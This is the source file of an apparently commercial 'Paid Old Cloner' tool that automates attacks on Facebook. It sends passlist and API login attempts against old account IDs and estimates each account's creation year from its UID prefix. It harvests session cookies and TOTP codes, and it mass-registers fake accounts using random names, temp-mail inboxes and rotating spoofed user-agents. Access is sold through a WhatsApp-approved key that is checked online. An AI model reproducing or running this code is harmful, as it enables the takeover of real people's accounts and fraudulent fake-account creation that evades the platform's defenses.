# cython: language_level=3
# cython: boundscheck=False
# cython: wraparound=False
# Author : Raja Vau (Raja Vau Teach World)
# File: Kamal.pyx (Converted to Cython for high performance and security)

import os
import sys
import time
import random
import string
import uuid
import shutil
import datetime
import json
import re
import threading
import urllib.request
import requests
import platform
import subprocess
import html
from pathlib import Path
from typing import Any
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred

try:
    import pyotp
except ImportError:
    pyotp = None

US_FIRST_NAMES = [
    "Aaliyah", "Abigail", "Adeline", "Alexa", "Alice", "Allison", "Amelia",
    "Angelica", "Anna", "Ariana", "Arianna", "Aubrey", "Audrey", "Aurora",
    "Autumn", "Ava", "Avery", "Bella", "Beatrice", "Brielle", "Cora",
    "Diana", "Eleanor", "Elizabeth", "Emily", "Emma", "Grace", "Hazel",
    "Isabella", "Ivy", "Julia", "Kaylee", "Kennedy", "Kimberly", "Kinsley",
    "Lillian", "Lily", "Linda", "Luna", "Olivia", "Sophia", "Stella",
    "Taylor", "Victoria", "Yolanda", "Yvonne", "Zoe", "Zoey",
]
US_SURNAMES = [
    "Adams", "Allen", "Anderson", "Baker", "Brown", "Clark", "Davis",
    "Garcia", "Gomez", "Gonzalez", "Green", "Harris", "Harper", "Hill",
    "Johnson", "Jones", "King", "Lee", "Lewis", "Lopez", "Martin", "Miller",
    "Moore", "Morales", "Perez", "Rivera", "Roberts", "Robinson", "Smith",
    "Taylor", "Thomas", "Thompson", "Torres", "Walker", "White", "Wilson",
    "Wright", "Young",
]
BD_FIRST_NAMES = [
    "Adiba", "Afia", "Afroza", "Afsana", "Afsari", "Aklima", "Akter", "Alifa",
    "Anamika", "Anika", "Anisa", "Anjuli", "Anjuman", "Anonna", "Arifa", "Arin",
    "Arpita", "Ashfia", "Asifa", "Asma", "Ayesha", "Bithi", "Bonhi", "Bonna",
    "Borsha", "Falgun", "Faria", "Farzana", "Hasina", "Jannat", "Jesmin", "Joya",
    "Jumaiya", "Kaniz", "Kanta", "Karishma", "Khadija", "Khadiza", "Khaleda",
    "Khatun", "Konika", "Laboni", "Laila", "Lamia", "Lubaba", "Lubna", "Lydia",
    "Maliha", "Mariya", "Mim", "Mousumi", "Nadia", "Nargis", "Nasrin", "Nazia",
    "Nusrat", "Pakhi", "Papia", "Puja", "Rahima", "Raisa", "Rokeya", "Sanjan",
    "Sarah", "Shabnam", "Shibani", "Shirin", "Sumaiya", "Tahmina", "Tania",
]
BD_SURNAMES = [
    "Akter", "Begum", "Chowdhury", "Haque", "Hossain", "Islam", "Khan", "Khatun",
    "Rahman", "Sarkar", "Sultana",
]
PH_FIRST_NAMES = [
    "Angelica", "Ariana", "Arianna", "Beatrice", "Belen", "Bella", "Carmen",
    "Cristina", "Diana", "Elena", "Isabel", "Josefina", "Josephine", "Juana",
    "Maria", "Maricel", "Patricia", "Rebecca", "Rosa", "Rosario", "Sofia",
    "Teresa", "Valerie",
]
PH_SURNAMES = [
    "Aquino", "Cruz", "Dela Cruz", "Garcia", "Gomez", "Lopez", "Reyes",
    "Rivera", "Santos", "Torres",
]

LANGUAGES = [
    "ar-ae", "cs-cz", "de-at", "de-de", "el-gr", "en-GB", "en-au", "en-ca",
    "en-gb", "en-in", "en-nz", "en-ph", "en-sg", "en-us", "es-mx", "fa-ir",
    "fr-ch", "fr-fr", "gu-in", "hi-in", "id-id", "in-id", "ja-jp", "ko-kr",
    "ms-my", "my-zg", "nl-nl", "pt-br", "ru-ru", "th-th", "tr-tr", "uk-ua",
    "vi-vn", "zh-cn", "zh-hk", "zh-tw",
]

MODEL_STRINGS = [
    "GT-S5670", "GT-1015", "GT-1020", "GT-1030", "GT-1035", "GT-1040",
    "GT-1045", "GT-1050", "GT-1240", "GT-1440", "GT-1450", "GT-18190",
    "GT-18262", "GT-19060I", "GT-19082", "GT-19083", "GT-19105", "GT-19152",
    "GT-19192", "GT-19300", "GT-19505", "GT-2000", "GT-20000", "GT-200s",
    "GT-3000", "GT-414XOP", "GT-6918", "GT-7010", "GT-7020", "GT-7030",
    "GT-7040", "GT-7050", "GT-7100", "GT-7105", "GT-7110", "GT-7205",
    "GT-7210", "GT-7240R", "GT-7245", "GT-7303", "GT-7310", "GT-7320",
    "GT-7325", "GT-7326", "GT-7340", "GT-7405", "GT-8010", "GT-8105",
    "GT-8110", "GT-8220S", "GT-8410", "GT-9300", "GT-9320", "GT-93G",
    "GT-A7100", "GT-A9500", "GT-B2710", "GT-B5330", "GT-B5510", "GT-B5722",
    "GT-B7510", "GT-B7722", "GT-B7810", "GT-B9150", "GT-B9388", "GT-C3010",
    "GT-C3262", "GT-C3312", "GT-C3322", "GT-C3520", "GT-C3592", "GT-C3595",
    "GT-E1500", "GT-E2200", "GT-E2250", "GT-E2600", "GT-E3210", "GT-G530H",
    "GT-G930F", "GT-H9500", "GT-I5508", "GT-I5801", "GT-I6410", "GT-I8150",
    "GT-I8160OKLTPA", "GT-I8258", "GT-I8262D", "GT-I8268", "GT-I8505",
    "GT-I8750", "GT-I900", "GT-I9080E", "GT-I9082C", "GT-I9082i", "GT-I9100G",
    "GT-I9100M", "GT-I9100P", "GT-I9100T", "GT-I9128E", "GT-I9128I", "GT-I9128V",
    "GT-I9158P", "GT-I9158V", "GT-I9168I", "GT-I9192I", "GT-I9195H", "GT-I9195L",
    "GT-I9250", "GT-I9303I", "GT-I9305N", "GT-I9308I", "GT-I9505G", "GT-I9505X",
    "GT-I9507V", "GT-I9600", "GT-N5100", "GT-N5105", "GT-N5110", "GT-N5120",
    "GT-N7000B", "GT-N7005", "GT-N7102", "GT-N7105", "GT-N7108", "GT-N8000",
    "GT-N8005", "GT-N8010", "GT-N8020", "GT-N9000", "GT-N9505", "GT-P1000CWAXSA",
    "GT-P1000M", "GT-P1000T", "GT-P1010", "GT-P3100B", "GT-P3105", "GT-P3108",
    "GT-P3110", "GT-P5100", "GT-P5200", "GT-P5210XD1", "GT-P5220", "GT-P6200",
    "GT-P6200L", "GT-P6201", "GT-P6210", "GT-P6211", "GT-P6800", "GT-P7100",
    "GT-P7300", "GT-P7310", "GT-P7320", "GT-P7500D", "GT-P7500M", "GT-P7500R",
    "GT-P7500V", "GT-P7501", "GT-P7511", "GT-S3330", "GT-S3332", "GT-S3333",
    "GT-S3370", "GT-S3518", "GT-S3570", "GT-S3600i", "GT-S3650", "GT-S3653W",
    "GT-S3770K", "GT-S3770M", "GT-S3800W", "GT-S3802", "GT-S3850", "GT-S5220",
    "GT-S5220R", "GT-S5222", "GT-S5230", "GT-S5230W", "GT-S5233T", "GT-S5250",
    "GT-S5253", "GT-S5280", "GT-S5282", "GT-S5283B", "GT-S5292", "GT-S5300",
    "GT-S5300L", "GT-S5301", "GT-S5301B", "GT-S5301L", "GT-S5302", "GT-S5302B",
    "GT-S5303", "GT-S5303B", "GT-S5310", "GT-S5310B", "GT-S5310C", "GT-S5310E",
    "GT-S5310G", "GT-S5310I", "GT-S5310L", "GT-S5310M", "GT-S5310N", "GT-S5312",
    "GT-S5312B", "GT-S5312C", "GT-S5312L", "GT-S5318", "GT-S5360", "GT-S5360B",
    "GT-S5360L", "GT-S5360T", "GT-S5363", "GT-S5367", "GT-S5369", "GT-S5380",
    "GT-S5500", "GT-S5560", "GT-S5560i", "GT-S5570B", "GT-S5570I", "GT-S5570L",
    "GT-S5578", "GT-S5600", "GT-S5603", "GT-S5610", "GT-S5610K", "GT-S5611",
    "GT-S5620", "GT-S5670B", "GT-S5690", "GT-S5690R", "GT-S5830", "GT-S5830D",
    "GT-S5830G", "GT-S5830L", "GT-S5830M", "GT-S5830T", "GT-S5830V", "GT-S5830i",
    "GT-S5831i", "GT-S5838", "GT-S5839i", "GT-S6010", "GT-S6012", "GT-S6102",
    "GT-S6310B", "GT-S6312", "GT-S6352", "GT-S6500", "GT-S6500D", "GT-S6500L",
    "GT-S6790", "GT-S6790L", "GT-S6790N", "GT-S6792L", "GT-S6800", "GT-S6802",
    "GT-S6810", "GT-S6810B", "GT-S6810E", "GT-S6810L", "GT-S6810M", "GT-S6810P",
    "GT-S6812", "GT-S6812B", "GT-S6812C", "GT-S6812i", "GT-S6818", "GT-S6818V",
    "GT-S7230E", "GT-S7233E", "GT-S7250D", "GT-S7262", "GT-S7270", "GT-S7270L",
    "GT-S7272", "GT-S7272C", "GT-S7273T", "GT-S7278", "GT-S7278U", "GT-S7390",
    "GT-S7390G", "GT-S7390L", "GT-S7392", "GT-S7392L", "GT-S7500", "GT-S7500L",
    "GT-S7500T", "GT-S7560", "GT-S7560M", "GT-S7562", "GT-S7562C", "GT-S7562L",
    "GT-S7562i", "GT-S7566", "GT-S7568", "GT-S7568I", "GT-S7572", "GT-S7580E",
    "GT-S7583T", "GT-S758X", "GT-S7592", "GT-S7710", "GT-S7710L", "GT-S7898",
    "GT-S7898I", "GT-S8500", "GT-S8530", "GT-S8600", "GT-STB919", "GT-T140",
    "GT-T150", "GT-V8a", "GT-V8i", "GT-VC818", "GT-VM919S", "GT-W131",
    "GT-W153", "GT-X831", "GT-X853", "GT-X870", "GT-X890", "GT-Y8750",
    "GT-g900f", "GT-i8700", "GT-i9040", "GT-m190", "GT-mini", "GT-s5233w",
    "GT-s5260", "Infinix X612B", "Infinix X665E", "Infinix X669C", "Infinix X676C",
    "Infinix X6810", "Infinix X6811", "Infinix X6823", "Infinix X683", "Infinix X689C",
    "M2101K9AG", "Redmi Note 5", "Redmi Note 7", "Redmi Note 8", "X572-LTE",
]

KEY_FILE = "/sdcard/RAJAVAU/saved_key.txt"
KEYS_URL = "https://raw.githubusercontent.com/rajavaupaidversoin/Admin/refs/heads/main/key.txt"
PROXY_URL = ""
DEFAULT_PASSWORD_FILE = "/sdcard/RAJAVAU/default_password.txt"
TWO_FA_KEY_FILE = "/sdcard/RAJAVAU/2fa_keys.txt"
UID_PASS_COOKIES_FILE = "/sdcard/RAJAVAU/accounts.txt"
AUTO_CREATE_FILE = "/sdcard/RAJAVAU/auto_create.txt"
TEMP_MAIL_API = "https://api.tempmail.lol/v2/inbox"
FACEBOOK_SUBMIT_URL = "https://m.facebook.com/reg/submit/"
FACEBOOK_REG_URL = "https://b-api.facebook.com/method/auth.login"
FACEBOOK_X_REG_URL = "https://graph.facebook.com/v15.0/auth/login"
FACEBOOK_GRAPH_URL = "https://graph.facebook.com/"
OTP_PATTERN = r"(\d{4,8})"
OTP_PATTERN_LONG = r"(\b\d{6}\b)"
BR_PATTERN = r"<br\s*/?>"
HTML_TAG_PATTERN = r"<[^>]+>"
BANNER_LINES = ["KAMAL FIRE TOOL"]
SEPARATORS = ["────────────────────────────────────────────"]

HEADERS = {
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}

def get_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 45

def check_online_approval(saved_key):
    """
    Online check: Validates if the saved key exists in GitHub key.txt.
    If removed by admin, terminates/logs out immediately.
    """
    try:
        req = urllib.request.Request(KEYS_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as response:
            data = response.read().decode('utf-8')
            approved_keys = [line.strip() for line in data.splitlines() if line.strip()]
            if saved_key in approved_keys:
                return True
    except Exception:
        pass
    return False

def start_background_key_monitor(saved_key):
    """
    Background thread to continuously check if the key is removed from online key.txt.
    If removed, forces logout and exits the tool immediately.
    """
    def monitor():
        while True:
            time.sleep(30) # Check every 30 seconds
            if not check_online_approval(saved_key):
                width = max(get_width(), 40)
                padding = " " * max(0, (width - 45) // 2)
                print(f"\n\n{padding}\033[1;31m[!] Your key has been removed by Admin! Logging out...\033[0m")
                try:
                    if os.path.exists(KEY_FILE):
                        os.remove(KEY_FILE)
                except Exception:
                    pass
                time.sleep(2)
                os._exit(0)
    
    t = threading.Thread(target=monitor, daemon=True)
    t.start()

def approval_system():
    saved_key_path = "/sdcard/RAJAVAU/saved_key.txt"
    if os.path.exists(saved_key_path):
        try:
            with open(saved_key_path, "r", encoding="utf-8") as f:
                saved_key = f.read().strip()
            if saved_key:
                if check_online_approval(saved_key):
                    width = max(get_width(), 40)
                    padding = " " * max(0, (width - 40) // 2)
                    os.system('clear' if os.name == 'posix' else 'cls')
                    print("\n\n")
                    print(f"{padding}\033[1;32m[✓] Key verified online! Loading tool...\033[0m")
                    time.sleep(1.5)
                    start_background_key_monitor(saved_key)
                    return
        except Exception:
            pass

    os.system("xdg-open https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI 2>/dev/null")
    unique_id = ''.join(random.choices('0123456789ABCDEF', k=6))
    user_key = f"RajaVauTeachWorld{unique_id}"
    try:
        os.makedirs("/sdcard/RAJAVAU", exist_ok=True)
        with open("/sdcard/RAJAVAU/My_Key.txt", "w", encoding="utf-8") as f:
            f.write(f"{user_key}\n")
    except Exception:
        pass
    
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 56) // 2)
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("\n")
        print(f"{padding}\033[1;96m    ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ \033[0m")
        print(f"{padding}\033[1;93m    ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;92m     ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝\033[0m")
        print(f"{padding}\033[1;96m      ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;94m       ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝\033[0m")
        print(f"{padding}\033[1;95m       ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m")
        print(f"{padding}\033[1;92m            ✦ WELCOME TO RAJA VAU TEACH WORLD ✦          \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m\n")
        
        print(f"{padding}\033[1;36m╔══════════════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32mYour Key     : \033[1;33m{user_key:<22}\033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;37mSend this key to WhatsApp for approval!              \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;35mWhatsApp No  : +880 1345-294347                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚══════════════════════════════════════════════════════╝\033[0m")
        print(f"{padding}\033[1;32m [1] Join WhatsApp & Send Key to Admin\033[0m")
        print(f"{padding}\033[1;32m [2] Check Approval Status (Online)\033[0m")
        print(f"{padding}\033[1;31m [0] Exit\033[0m")
        print(f"{padding}\033[1;36m──────────────────────────────────────────────────────\033[0m")
        
        choice = input(f"{padding}\033[1;33m [-] CHOOSE : \033[0m").strip()
        if choice == '1':
            wa_url = f"https://wa.me/+8801345294347?text=Assalamu%20Alaikum,%20Admin!%20My%20Key%20is%3A%20{user_key}"
            os.system(f"xdg-open '{wa_url}' 2>/dev/null")
            print(f"\n{padding}\033[1;32m [+] Redirecting to WhatsApp...\033[0m")
            time.sleep(2)
        elif choice == '2':
            print(f"\n{padding}\033[1;33m [+] Checking approval status from online... \033[0m")
            time.sleep(1.5)
            if check_online_approval(user_key):
                try:
                    with open(saved_key_path, "w", encoding="utf-8") as f:
                        f.write(f"{user_key}\n")
                except Exception:
                    pass
                print(f"\n{padding}\033[1;32m [✓] Your Key is Approved! Entering tool...\033[0m")
                time.sleep(2)
                start_background_key_monitor(user_key)
                break
            else:
                print(f"\n{padding}\033[1;31m [!] Your Key is not approved yet! Please contact admin.\033[0m")
                time.sleep(2.5)
        elif choice == '0':
            print(f"\n{padding}\033[1;31m [!] Exiting tool...\033[0m")
            sys.exit()
        else:
            print(f"\n{padding}\033[1;31m [!] Invalid Choice! Try again.\033[0m")
            time.sleep(1.5)

method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
rr = random.randint

def w761():
    """
    Generates a randomly selected Windows Chrome
    or Facebook Web-style User-Agent string.
    """

    chrome_versions = [
        "154.0.8037.92",
        "154.0.8037.100",
        "154.0.8037.110",
        "154.0.8037.120",
        "155.0.8059.84",
        "155.0.8059.90",
        "155.0.8059.100",
        "155.0.8059.110",
        "155.0.8059.120",
        "155.0.8059.130",
    ]

    windows_agents = [
        (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{version} Safari/537.36"
        )
        for version in chrome_versions
    ]

    facebook_web_agents = [
        (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            f"Chrome/{chrome} Safari/537.36"
        )
        for chrome in chrome_versions
    ]

    all_agents = windows_agents + facebook_web_agents

    return random.choice(all_agents)

def window761():
    """
    Generates a Windows Chrome User-Agent string (Extended Version).
    """
    chrome_versions = [
        "40.0.2214.89",
        "41.0.2272.118",
        "42.0.2311.90",
        "43.0.2357.124",
        "44.0.2403.157",
        "45.0.2454.101",
        "46.0.2490.86",
        "47.0.2526.106",
        "48.0.2564.116",
        "49.0.2623.112",
        "50.0.2661.102",
        "51.0.2704.106",
        "52.0.2743.116",
        "53.0.2785.143",
        "54.0.2840.99",
    ]

    A = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(chrome_versions)} Safari/537.36"
    )

    B = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(chrome_versions)} Safari/537.36"
    )

    C = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(chrome_versions)} Safari/537.36"
    )

    D = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(chrome_versions)} Safari/537.36"
    )

    return random.choice([A, B, C, D, w761()])

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D, window761()])

def window1():
    return window761()

def banner():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
        
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    
    print("\n")
    print(f"{padding}\033[1;31m  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗  \033[0m")
    print(f"{padding}\033[1;31m  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║  \033[0m")
    print(f"{padding}\033[1;31m  █████╔╝ ███████║██╔████╔██║███████║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║█████╗\033[0m\n")
    
    print(f"{padding}\033[1;36m╔═════════════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╠═════════════════════════════════════════════════════╣\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mTool Type     :\033[1;37m Paid Old Cloner                    \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mYouTube       :\033[1;34m https://youtube.com/@raja-vau      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚═════════════════════════════════════════════════════╝\033[0m\n")

def creationyear(uid):
    uid_str = str(uid)
    if len(uid_str) == 15:
        if uid_str.startswith('1000000000'): return '2009'
        if uid_str.startswith('100000000'): return '2009'
        if uid_str.startswith('10000000'): return '2009'
        if uid_str.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid_str.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid_str.startswith('100001'): return '2010'
        if uid_str.startswith(('100002', '100003')): return '2011'
        if uid_str.startswith('100004'): return '2012'
        if uid_str.startswith(('100005', '100006')): return '2013'
        if uid_str.startswith(('100007', '100008')): return '2014'
        if uid_str.startswith('100009'): return '2015'
        if uid_str.startswith('10001'): return '2016'
        if uid_str.startswith('10002'): return '2017'
        if uid_str.startswith('10003'): return '2018'
        if uid_str.startswith('10004'): return '2019'
        if uid_str.startswith('10005'): return '2020'
        if uid_str.startswith('10006'): return '2021'
        if uid_str.startswith('10009'): return '2023'
        if uid_str.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid_str) in (9, 10):
        return '2008'
    elif len(uid_str) == 8:
        return '2007'
    elif len(uid_str) == 7:
        return '2006'
    elif len(uid_str) == 14 and uid_str.startswith('61'):
        return '2024'
    else:
        return ''

def clear():
    os.system('clear')

def linex():
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;36m────────────────────────────────────────────\033[0m")

def _method_choice():
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1 (API LOGIN)        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2 (PASSLIST LOGIN)   \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31m[0] \033[1;33m---> \033[1;37mBACK                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    meth = input(f"{padding}\033[1;33m [-] CHOOSE METHOD ---> \033[0m").strip()
    return meth if meth in ('1', '2') else '1'

def _max_workers():
    return 30

def save_to_file(file_path: str, data: Any) -> None:
    path = Path(file_path).expanduser()
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as f:
        f.write(str(data))
        f.write("\n")

def get_random_proxy() -> dict[str, str] | None:
    return None

def ugenX() -> str:
    return window761()

def get_bd_name() -> str:
    return random.choice(BD_FIRST_NAMES)

def get_ph_name() -> str:
    return random.choice(PH_FIRST_NAMES)

def get_us_name() -> str:
    return random.choice(US_FIRST_NAMES)

def get_pass() -> str:
    password = get_default_password()
    if password:
        return password
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(10))

def get_bd_phone() -> str:
    prefixes = ["010", "011", "012", "013", "014", "015", "016", "017", "018", "019"]
    return random.choice(prefixes) + "".join(random.choice(string.digits) for _ in range(8))

def xiyadmailx_email() -> str:
    local = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    return f"{local}@xiyadmailx.xyz"

def get_default_password() -> str:
    for path in [Path(DEFAULT_PASSWORD_FILE), Path("2FA/default_password.txt")]:
        try:
            if path.exists():
                return path.read_text(encoding="utf-8").strip()
        except OSError:
            pass
    return ""

def set_default_password() -> str:
    current = get_default_password()
    if current:
        print("Default password already set!")
        return current
    password = input("Enter default password: ").strip()
    if not password:
        print("Password cannot be empty!")
        return ""
    path = Path(DEFAULT_PASSWORD_FILE)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(password, encoding="utf-8")
    print("Default password saved successfully!")
    return password

def just_2fa(secret: str | None = None) -> str | None:
    if secret is None:
        try:
            secret = Path(TWO_FA_KEY_FILE).read_text(encoding="utf-8").strip()
        except OSError:
            return None
    if not secret:
        return None
    if pyotp is None:
        raise RuntimeError("pyotp is required for 2FA generation")
    return pyotp.TOTP(secret).now()

def coki_ext(text: str = "") -> dict[str, str]:
    result: dict[str, str] = {}
    for name in ("c_user", "xs", "fr", "datr", "sb"):
        match = re.search(rf"(?:^|[;|\s]){re.escape(name)}=([^;|\s]+)", text)
        if match:
            result[name] = match.group(1)
    return result

def _registration_payload(email: str, password: str, first_name: str, last_name: str, phone: str | None = None) -> dict[str, str]:
    return {
        "firstname": first_name,
        "lastname": last_name,
        "reg_email__": email,
        "password": password,
        "birthday_day": str(random.randint(1, 28)),
        "birthday_month": str(random.randint(1, 12)),
        "birthday_year": str(random.randint(1985, 2002)),
        "sex": str(random.choice([1, 2])),
        "terms": "on",
        "phone": phone or "",
    }

def _createfb_request(url: str, payload: dict[str, Any], method: str = "post") -> Any:
    headers = dict(HEADERS)
    headers["User-Agent"] = window761()
    kwargs = {"headers": headers, "timeout": 30}
    if method.lower() == "get":
        return requests.get(url, params=payload, **kwargs)
    return requests.post(url, data=payload, **kwargs)

def createfb_method_1(email: str | None = None, password: str | None = None, first_name: str | None = None, last_name: str | None = None, phone: str | None = None, **kwargs: Any) -> dict[str, Any]:
    email = email or xiyadmailx_email()
    password = password or get_pass()
    first_name = first_name or get_bd_name()
    last_name = last_name or random.choice(BD_SURNAMES)
    payload = _registration_payload(email, password, first_name, last_name, phone)
    try:
        response = _createfb_request(FACEBOOK_SUBMIT_URL, payload)
        return {"status_code": response.status_code, "text": response.text, "payload": payload}
    except Exception as exc:
        return {"error": str(exc), "payload": payload}

def createfb_method_2(email: str | None = None, password: str | None = None, first_name: str | None = None, last_name: str | None = None, phone: str | None = None, **kwargs: Any) -> dict[str, Any]:
    email = email or xiyadmailx_email()
    password = password or get_pass()
    first_name = first_name or get_ph_name()
    last_name = last_name or random.choice(PH_SURNAMES)
    payload = _registration_payload(email, password, first_name, last_name, phone)
    try:
        response = _createfb_request(FACEBOOK_REG_URL, payload)
        return {"status_code": response.status_code, "text": response.text, "payload": payload}
    except Exception as exc:
        return {"error": str(exc), "payload": payload}

def createfb_method_3(email: str | None = None, password: str | None = None, first_name: str | None = None, last_name: str | None = None, phone: str | None = None, **kwargs: Any) -> dict[str, Any]:
    email = email or xiyadmailx_email()
    password = password or get_pass()
    first_name = first_name or get_us_name()
    last_name = last_name or random.choice(US_SURNAMES)
    payload = _registration_payload(email, password, first_name, last_name, phone)
    try:
        response = _createfb_request(FACEBOOK_X_REG_URL, payload)
        return {"status_code": response.status_code, "text": response.text, "payload": payload}
    except Exception as exc:
        return {"error": str(exc), "payload": payload}

class TempMail:
    def __init__(self, api: str | None = None):
        self.api = api or TEMP_MAIL_API
        self.email_id: str | None = None
        self.email_addr: str | None = None
        self.messages: list[dict[str, Any]] = []

    def create_email(self) -> str | None:
        try:
            response = requests.post(self.api, json={}, timeout=20)
            response.raise_for_status()
            data = response.json()
            self.email_addr = data.get("email") or data.get("email_addr") or data.get("address")
            self.email_id = data.get("id") or data.get("email_id")
            return self.email_addr
        except Exception:
            return None

    def check_inbox(self) -> list[dict[str, Any]]:
        if not self.email_id:
            return []
        try:
            url = f"{self.api}/{self.email_id}"
            response = requests.get(url, timeout=20)
            response.raise_for_status()
            data = response.json()
            messages = data.get("messages", data if isinstance(data, list) else [])
            self.messages = messages or []
            return self.messages
        except Exception:
            return []

    def fetch_email(self) -> dict[str, Any] | None:
        messages = self.check_inbox()
        return messages[0] if messages else None

    def clean_text(self, text: str) -> str:
        text = re.sub(BR_PATTERN, "\n", text, flags=re.I)
        if BeautifulSoup is not None:
            try:
                return BeautifulSoup(text, "html.parser").get_text(" ", strip=True)
            except Exception:
                pass
        text = re.sub(HTML_TAG_PATTERN, " ", text)
        return html.unescape(re.sub(r"\s+", " ", text)).strip()

    def extract_otp(self, text: str) -> str | None:
        text = self.clean_text(text)
        for pattern in (OTP_PATTERN_LONG, OTP_PATTERN):
            match = re.search(pattern, text, flags=re.I)
            if match:
                return match.group(1)
        return None

